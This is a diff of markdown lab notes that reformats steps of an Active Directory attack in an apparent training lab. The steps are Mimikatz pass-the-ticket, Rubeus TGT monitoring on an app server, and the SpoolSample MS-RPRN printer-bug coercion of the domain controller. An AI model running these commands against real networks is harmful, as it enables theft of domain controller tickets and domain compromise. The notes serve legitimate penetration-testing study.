@@ -258,7 +258,7 @@ Invoke-Mimikatz -Command '"kerberos::ptt C:\Users\appadmin\Documents\user1\[0;2c
 
 
 
-- We can capture the TGT of dcorp-dc$ by using Rubeus on **dcorp-appsrv**:
+- We can capture the TGT of dcorp-dc$ by using `Rubeus` on **dcorp-appsrv**:
 
 
 ```powershell
@@ -266,7 +266,11 @@ Rubeus.exe monitor /interval:5 /nowrap
 ```
 
 
-- And after that run MS-RPRN.exe - (https://github.com/leechristensen/SpoolSample) on the student VM:
-MS-RPRN.exe \\dcorp-dc.dollarcorp.moneycorp.local
-\\dcorp-appsrv.dollarcorp.moneycorp.local
+- And after that run `MS-RPRN.exe` - (https://github.com/leechristensen/SpoolSample) - on the student VM:
+
+
+```powershell
+MS-RPRN.exe \\dcorp-dc.dollarcorp.moneycorp.local \\dcorp-appsrv.dollarcorp.moneycorp.local
+```
+
 
